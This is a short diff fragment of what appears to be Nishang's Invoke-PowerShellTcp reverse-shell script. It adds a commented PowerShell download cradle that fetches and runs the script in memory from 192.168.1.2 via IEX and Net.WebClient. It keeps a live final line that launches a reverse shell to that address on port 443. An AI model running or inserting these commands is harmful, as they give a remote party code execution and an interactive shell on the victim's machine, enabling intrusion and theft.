@@ -124,4 +124,5 @@ https://github.com/samratashok/nishang
     }
 } 
 
+# powershell -Command "IEX (New-Object Net.WebClient).DownloadString('http://192.168.1.2/Invoke-PowerShellTcp.ps1')"
 Invoke-PowerShellTcp -Reverse -IPAddress 192.168.1.2 -Port 443
